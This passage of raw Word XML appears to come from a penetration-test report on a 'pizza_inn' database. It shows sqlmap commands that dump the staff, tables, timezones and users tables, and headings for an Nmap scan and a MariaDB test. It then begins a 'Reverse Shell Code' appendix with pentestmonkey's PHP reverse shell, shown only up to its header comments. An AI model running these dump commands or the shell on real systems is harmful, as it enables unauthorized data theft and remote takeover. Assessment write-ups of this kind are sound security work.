                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4A9227" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DD5E717" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>staff -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520F402F" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6463EB44" wp14:editId="68457202">
            <wp:extent cx="4914900" cy="600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4900" cy="600075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1E3B51" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58D67003" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>tables -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3593F7E9" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4B33A805" wp14:editId="17C193DF">
            <wp:extent cx="1943100" cy="733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100" cy="733425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="089A70CD" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27E62312" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>timezones -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DC1EAA" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7852937F" wp14:editId="12F165E7">
            <wp:extent cx="3333750" cy="752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3750" cy="752475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11913148" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A1C629D" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>users -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFFD123" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="51DEFEA6" wp14:editId="72DBF4D4">
            <wp:extent cx="3705225" cy="733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5225" cy="733425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A071D15" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DF381B9" w14:textId="77777777" w:rsidR="007577DE" w:rsidRPr="00DA102C" w:rsidRDefault="007577DE" w:rsidP="007577DE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="90" w:name="_Toc58836635"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>9.1 Nmap Scan</w:t>
      </w:r>
      <w:bookmarkEnd w:id="90"/>
    </w:p>
    <w:p w14:paraId="61C480E7" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="007577DE" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B4C50A3" wp14:editId="39BE8583">
            <wp:extent cx="5943600" cy="713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13740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9210EF" w14:textId="77777777" w:rsidR="007577DE" w:rsidRDefault="007577DE" w:rsidP="00F05E7D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="91" w:name="_Toc58836636"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:r w:rsidR="00F05E7D">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MariaDB Pen Test</w:t>
      </w:r>
      <w:bookmarkEnd w:id="91"/>
    </w:p>
    <w:p w14:paraId="60A073B1" w14:textId="77777777" w:rsidR="007577DE" w:rsidRDefault="007577DE" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D14B5A6" wp14:editId="7E8990F2">
            <wp:extent cx="5943600" cy="717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717550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06834976" w14:textId="77777777" w:rsidR="009A241B" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="_Toc58836637"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>10.1 Reverse Shell Code</w:t>
      </w:r>
      <w:bookmarkEnd w:id="92"/>
    </w:p>
    <w:p w14:paraId="75A5E684" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78894E0F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// php-reverse-shell - A Reverse Shell implementation in PHP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46849C3F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686AEE08" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693A9E3E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// This tool may be used for legal purposes only.  Users take full responsibility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D59B9A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// for any actions performed using this tool.  The author accepts no liability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BF05B7" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// for damage caused by this tool.  If these terms are not acceptable to you, then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4AFBC0" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// do not use this tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A8A60E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F72E7E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// In all other respects the GPL version 2 applies:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BF7596" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0EBEDB" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// This program is free software; you can redistribute it and/or modify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBC9658" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// it under the terms of the GNU General Public License version 2 as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E0B669" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// published by the Free Software Foundation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC2D181" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EC2945" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// This program is distributed in the hope that it will be useful,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F7E2A7" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// but WITHOUT ANY WARRANTY; without even the implied warranty of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBF0F69" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BF1AD2" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// GNU General Public License for more details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48749E70" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CEF18B6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// You should have received a copy of the GNU General Public License along</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B93D8C8" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// with this program; if not, write to the Free Software Foundation, Inc.,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F04241" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692A8A08" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFE4D9E" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// This tool may be used for legal purposes only.  Users take full responsibility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F471C6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// for any actions performed using this tool.  If these terms are not acceptable to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BDAECB" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// you, then do not use this tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E770F2" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE4CD87" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// You are encouraged to send comments, improvements or suggestions to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAD972C" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// me at pentestmonkey@pentestmonkey.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678D58BC" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349217C3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A66A28" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024363F7" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// This script will make an outbound TCP connection to a hardcoded IP and port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5EAFA1" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// The recipient will be given a shell running as the current user (apache normally).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41849679" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168D686A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Limitations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EB76C9" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6938D369" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</w:t>
      </w:r>
    </w:p>
